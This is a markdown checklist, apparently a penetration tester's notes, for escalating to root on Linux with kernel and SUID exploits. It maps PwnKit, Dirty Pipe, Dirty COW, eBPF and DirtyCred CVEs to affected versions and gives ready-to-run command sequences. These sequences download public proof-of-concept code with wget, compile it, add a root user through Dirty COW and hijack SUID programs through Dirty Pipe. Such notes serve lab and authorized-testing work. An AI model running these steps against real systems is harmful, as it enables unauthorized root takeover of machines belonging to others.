# Linux privesc: kernel exploits

## Last, and one at a time
- [ ] Everything else tried first: :Pb linux-enum, :Pb linux-creds
- [ ] One exploit at a time: a failed one can crash the box, and a revert loses my place

## The exact versions
uname -a
cat /etc/os-release
cat /proc/version
pkexec --version
sudo -V | head -1
which gcc cc
- [ ] An old sudo: :Pb sudo, which has Baron Samedit

## Leads
- [ ] linpeas's exploit suggester section read: leads only, since distributions backport fixes without changing the version
THE-VERSION is the kernel's, such as 4.4, and THE-RELEASE the distribution's, such as ubuntu 16.04:
searchsploit linux kernel THE-VERSION | grep -i privilege
searchsploit THE-RELEASE local

## Which one fits
- [ ] PwnKit, CVE-2021-4034: a SUID pkexec on nearly any distribution before January 2022
- [ ] Dirty Pipe, CVE-2022-0847: kernel 5.8 up to the fixes in 5.16.11, 5.15.25 and 5.10.102
- [ ] Dirty COW, CVE-2016-5195: kernels before the October 2016 fixes, below 4.8.3
- [ ] eBPF verifier, CVE-2017-16995: below 4.13.9, such as Ubuntu 16.04's 4.4.0-116, EDB 45010
- [ ] DirtyCred, CVE-2021-4154: CentOS 8 kernels from 4.18.0-305.el8, and Ubuntu 20.04's 5.4 and 5.11
- [ ] ip_append_data, CVE-2009-2698: 2.6 kernels below 2.6.19, such as RHEL 4 and 5's 2.6.9, EDB 9542

## Build and run one from searchsploit
<EdbID> is the exploit's number:
searchsploit -m <EdbID>
head -n 40 <EdbID>.c
- [ ] Its header read: the versions it affects, how to compile it, and how to run it
On the target when it has gcc, or else on Kali, statically, then fetched through serve:
gcc <EdbID>.c -o exploit
gcc -static <EdbID>.c -o exploit
chmod +x exploit
./exploit
- [ ] cc1 not found on the target: find / -name cc1 2>/dev/null, and its folder added to PATH
- [ ] GLIBC_2.34 not found from a Kali build: -static, or built on a release as old as the target's

## PwnKit
wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/4289592a4603a1ee62d3d5b39a4e3b958453887a/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o pwnkit
./pwnkit
- [ ] This PoC calls gcc on the target as it runs: with no gcc there, a static build such as ly4k's PwnKit
- [ ] No network on the target: the file fetched on Kali, into the target's upload/ folder for serve

## Dirty COW, a new root user
wget https://raw.githubusercontent.com/firefart/dirtycow/75242ef4a92b02e6ea0e6062147d62632fdeca1b/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty 'Pwned123!'
su firefart
Afterwards, as root:
mv /tmp/passwd.bak /etc/passwd

## Dirty Pipe, through a SUID program
searchsploit -m 50808
gcc 50808.c -o dirtypipe
find / -perm -4000 -type f 2>/dev/null
./dirtypipe /usr/bin/sudo
- [ ] Any SUID program from that list in place of sudo
